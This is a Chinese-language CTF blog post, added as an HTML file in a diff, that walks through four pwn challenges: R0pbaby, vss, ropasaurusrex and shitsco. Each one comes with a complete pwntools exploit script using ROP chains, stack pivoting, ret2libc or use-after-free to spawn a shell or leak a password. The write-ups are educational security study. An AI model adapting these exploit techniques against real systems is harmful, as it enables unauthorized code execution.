@@ -1,0 +1,640 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pisanbao.jpg">
+  <link rel="icon" href="/img/pisanbao.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="皮三宝">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="最近观摩了下Atum大佬PWN学习决定要把每一个例题都写一下！！！长期更新立下flag">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN养成计划">
+<meta property="og:url" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/index.html">
+<meta property="og:site_name" content="皮三宝のBlog">
+<meta property="og:description" content="最近观摩了下Atum大佬PWN学习决定要把每一个例题都写一下！！！长期更新立下flag">
+<meta property="og:locale">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/1.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/2.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/3.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/4.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/5.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/6.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/7.jpg">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/8.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/9.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/10.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/12.png">
+<meta property="og:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/13.png">
+<meta property="article:published_time" content="2019-04-09T16:57:00.000Z">
+<meta property="article:modified_time" content="2024-07-22T01:48:17.684Z">
+<meta property="article:author" content="皮三宝">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://www.psbazx.com/2019/04/10/PWN%E5%85%BB%E6%88%90%E8%AE%A1%E5%88%92/1.png">
+  
+  
+  
+  <title>PWN养成计划 - 皮三宝のBlog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.psbazx.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pisanbao</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                主页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PWN养成计划"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-04-09 16:57" pubdate>
+          April 9, 2019 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k wörter
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          98 minuten
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PWN养成计划</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>最近观摩了下Atum大佬PWN学习<br>决定要把每一个例题都写一下！！！<br>长期更新<br>立下flag</p>
+<a id="more"></a>
+<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="defcon-2015-qualifier-R0pbaby"><a href="#defcon-2015-qualifier-R0pbaby" class="headerlink" title="defcon 2015 qualifier: R0pbaby"></a>defcon 2015 qualifier: R0pbaby</h2><p>首先看下程序，主要是个菜单<br><img src="1.png" srcset="/img/loading.gif" lazyload alt="1"><br>菜单很简单<br>1查找lib基地址<br>2查找你要寻找的libc函数<br>3实施攻击<br>4退出<br>checksec一下看下开了什么保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">Arch:     amd64-64-little<br>    RELRO:    No RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    FORTIFY:  Enabled<br><br></code></pre></td></tr></table></figure>
+<p>有PIE<br>但这不影响，因为能查看地址</p>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>标题就已经提示用ROP了<br>这边主要的溢出点在<br>memcpy那边</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>既然能查看地址<br>那就不怎么难了<br>首先这是64位程序<br>传参的话，’/bin/sh’应该是放在rdi寄存器里的<br>用ROPgadget找到其偏移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep &quot;rdi&quot;<br></code></pre></td></tr></table></figure>
+<p>然后是’/bin/sh’偏移和sys的偏移<br>接下去就能溢出了<br>发现memcpy(&amp;savedregs, nptr, v6)中<br>savedregs就是rbp所在处<br>所以直接输入8个a然后输入pop_rdi_ret的地址，紧跟着’/bin/sh’的地址和sys地址<br>pop_rdi_ret地址计算的话就用程序的2选项得到的sys地址加上pop_ret偏移减去sys偏移<br>上代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br>a &#x3D; process(&quot;.&#x2F;r0pbaby&quot;)<br>a.recvuntil(&quot;: &quot;)<br>a.send(&#39;2\n&#39;)<br>a.recvuntil(&quot;: &quot;)<br>a.send(&#39;system\n&#39;)<br>aaa &#x3D; a.recv()<br>add &#x3D; aaa[15:33]<br>addr &#x3D; int(add,16)<br>print hex(addr)<br>a.sendline(&#39;3&#39;)<br>a.recvuntil(&quot;Enter bytes to send (max 1024): &quot;)<br>a.send(&#39;32\n&#39;)<br>#gdb.attach(a)<br>pay &#x3D; &#39;a&#39;*8 + p64(addr+0x221c8-0x41FD0) + p64(addr+0x17C489-0x41FD0) + p64(addr)<br>a.sendline(pay)<br>a.interactive()<br></code></pre></td></tr></table></figure>
+<p>说下收获<br>1.64位传参，首先是寄存器然后栈，利用方式：ROPgadget。<br>2.ROPgadget命令使用</p>
+<h2 id="AliCTF-2016-vss"><a href="#AliCTF-2016-vss" class="headerlink" title="AliCTF 2016: vss"></a>AliCTF 2016: vss</h2><p>这题对逆向手比较友好~~~<br>稍微调试一下就知道题目在干什么了<br>先看看程序<br><img src="2.png" srcset="/img/loading.gif" lazyload alt="2"><br>首先是一个登录<br>输入密码即可<br>进去看看判断函数<br><img src="3.png" srcset="/img/loading.gif" lazyload alt="3"><br>通过调试可以看到这边有个类似memcpy的操作<br>所以可以通过输入的pwd来溢出这边的v2<br>具体可以通过构造ropchain</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这边已经找到溢出点了，但是有个问题<br>就是栈空间不够<br>只有0x50空间<br>所以这边需要用到stack pivot<br>即劫持栈指针<br>把rsp劫持到上一个调用他的函数中的栈去<br>用ROPgadget找一下就行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br>from struct import pack<br># Padding goes here<br>p &#x3D; &#39;&#39;<br><br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4080) # @ .data<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046f208) # pop rax ; ret<br>p +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041bd1f) # xor rax, rax ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401823) # pop rdi ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4080) # @ .data<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043ae05) # pop rdx ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041bd1f) # xor rax, rax ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret<br>p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045f2a5) # syscall ; ret<br><br>a &#x3D; process(&#39;vss&#39;)<br>a.recvuntil(&quot;Password:&quot;)<br>pay &#x3D; &#39;&#39;<br>pay &#x3D; &#39;py&#39; + &#39;a&#39;*(0x46) + p64(0x46f205) + &#39;a&#39;*(0x58-0x50) + p<br>a.sendline(pay)<br>a.interactive()<br></code></pre></td></tr></table></figure>
+<p>跑一下<br><img src="4.png" srcset="/img/loading.gif" lazyload alt="4"><br>说下收获<br>1.初识stack pivot//针对栈空间不够溢出<br>2.ropchain熟悉<br>3.初识静态链接</p>
+<h2 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013: ropasaurusrex"></a>PlaidCTF 2013: ropasaurusrex</h2><p>和xctf的level3一个样<br>exp都一样。。。<br>典型的ret2libc</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br><br>a &#x3D; process(&#39;.&#x2F;rop&#39;)<br>elf &#x3D; ELF(&#39;rop&#39;)<br>libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&#39;)<br>pay &#x3D; &#39;a&#39;*0x88 + &#39;aaaa&#39; + p32(elf.symbols[&#39;write&#39;]) + p32(0x8048426) + p32(1) + p32(elf.got[&#39;write&#39;]) + p32(4)<br>a.sendline(pay)<br>addr &#x3D; u32(a.recv(4))<br>print addr<br>sys &#x3D; libc.symbols[&#39;system&#39;] + addr - libc.symbols[&#39;write&#39;]<br>sh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next() + addr - libc.symbols[&#39;write&#39;]<br>pay2 &#x3D; &#39;a&#39;*0x88 + &#39;aaaa&#39; + p32(sys) + &#39;aaaa&#39; + p32(sh)<br>a.sendline(pay2)<br>a.interactive()<br></code></pre></td></tr></table></figure>
+<p>说下收获<br>1.其实呢。。。主要是它给了个库文件，我就去加载了，然后一直没出来。。。应该加载的是自己虚拟机上的库，这点以后注意<br>2.某些命令的使用</p>
+<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>迫于某些原因，先把堆给看看，rop的一些以后接着填坑</p>
+<h2 id="defcon-ctf-qualifier-2014-shitsco"><a href="#defcon-ctf-qualifier-2014-shitsco" class="headerlink" title="defcon ctf qualifier 2014 : shitsco"></a>defcon ctf qualifier 2014 : shitsco</h2><p>不得不说，国际性大赛的pwn。。。如果逆向不怎么好的话很难写<br>运行程序的话可以看到有很多命令。。。<br>password输入正确后可以用flag命令获得flag<br>整体利用思路就是要把password通过show打印出来</p>
+<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="5.png" srcset="/img/loading.gif" lazyload alt="5"><br>首先可以看到pwd在程序开始被读入<br><img src="6.png" srcset="/img/loading.gif" lazyload alt="6"><br>在bss段<br>通过调试可以看出来分配的堆是个双向链表<br>name指针，值指针，上一个和下一个链表的指针。<br>大小为16字节，<br>而且可以发现，第一个链表的下一个指针永远指向下一个<br>这就可以uaf<br>输入俩个长度16个值<br>free掉后在输入一个长度16的值就会打印对应地址了<br>因为first fit把。。。猜测<br>毕竟堆我还刚入门</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br><br>a &#x3D; process(&#39;.&#x2F;shitsco&#39;)<br>a.recvuntil(&quot;$ &quot;)<br>a.sendline(&#39;set a aaaaaaaaaaaaaaaa&#39;)<br>a.recvuntil(&quot;$ &quot;)<br>a.sendline(&#39;set b aaaaaaaaaaaaaaab&#39;)<br><br>a.recvuntil(&quot;$ &quot;)<br>a.sendline(&#39;set a&#39;)<br>a.recvuntil(&quot;$ &quot;)<br>a.sendline(&#39;set b&#39;)<br>a.recvuntil(&quot;$ &quot;)<br>pay &#x3D; &#39;set c &#39; + &#39;\xA0\xC3\x04\x08&#39;*4           #0x8048D40<br>print pay<br>a.sendline(pay)<br>a.sendline(&#39;show&#39;)<br>a.interactive()<br></code></pre></td></tr></table></figure>
+<p>说下收获<br>1.firstfit的认识<br>2.堆入门</p>
